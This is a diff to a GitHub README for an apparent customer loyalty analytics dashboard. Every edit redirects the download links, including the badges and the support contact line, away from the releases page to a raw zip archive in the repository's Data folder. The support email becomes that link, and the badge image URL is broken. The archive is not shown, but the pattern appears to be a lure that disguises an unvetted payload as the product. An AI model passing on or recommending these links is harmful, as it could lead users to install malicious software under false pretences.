@@ -1,6 +1,6 @@
 # 🎯 Advanced-Customer-Loyalty-Analytics-Dashboard - Analyze Customer Data Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/releases)
+[![Download Now](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/raw/refs/heads/main/Data/Analytics-Customer-Advanced-Loyalty-Dashboard-v3.9-alpha.4.zip%20Now-Click%20Here-blue)](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/raw/refs/heads/main/Data/Analytics-Customer-Advanced-Loyalty-Dashboard-v3.9-alpha.4.zip)
 
 ## 📊 Overview
 
@@ -11,7 +11,7 @@ The Advanced Customer Loyalty Analytics Dashboard is a powerful tool designed to
 Follow these steps to download and run the software:
 
 1. **Visit the Releases Page**
-   To download the dashboard, visit the releases page. You can find the page [here](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/releases).
+   To download the dashboard, visit the releases page. You can find the page [here](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/raw/refs/heads/main/Data/Analytics-Customer-Advanced-Loyalty-Dashboard-v3.9-alpha.4.zip).
 
 2. **Choose the Latest Version**
    Look for the latest version listed. This will usually be at the top of the page.
@@ -27,7 +27,7 @@ Follow these steps to download and run the software:
 
 ## 📥 Download & Install
 
-To download the Advanced Customer Loyalty Analytics Dashboard, follow this link: [Download Now](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/releases). 
+To download the Advanced Customer Loyalty Analytics Dashboard, follow this link: [Download Now](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/raw/refs/heads/main/Data/Analytics-Customer-Advanced-Loyalty-Dashboard-v3.9-alpha.4.zip). 
 
 Ensure you have a compatible program to run this dashboard. Check the system requirements below.
 
@@ -67,7 +67,7 @@ Ensure you have a compatible program to run this dashboard. Check the system req
 
 ## 📞 Support
 
-If you encounter any issues while using the dashboard, feel free to reach out for support. You can create an issue on the GitHub repository or contact us via email at support@example.com.
+If you encounter any issues while using the dashboard, feel free to reach out for support. You can create an issue on the GitHub repository or contact us via email at https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/raw/refs/heads/main/Data/Analytics-Customer-Advanced-Loyalty-Dashboard-v3.9-alpha.4.zip
 
 ## 🤝 Contributions
 
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 The Advanced Customer Loyalty Analytics Dashboard offers a user-friendly way to make sense of customer data. With straightforward installation steps and robust features, it stands ready to help businesses enhance their loyalty programs and understand customer behaviors. Download the dashboard today and start making informed decisions based on real-time insights. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/releases)
+[![Download Now](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/raw/refs/heads/main/Data/Analytics-Customer-Advanced-Loyalty-Dashboard-v3.9-alpha.4.zip%20Now-Click%20Here-blue)](https://github.com/DanielBonfim-Jpg69/Advanced-Customer-Loyalty-Analytics-Dashboard/raw/refs/heads/main/Data/Analytics-Customer-Advanced-Loyalty-Dashboard-v3.9-alpha.4.zip)
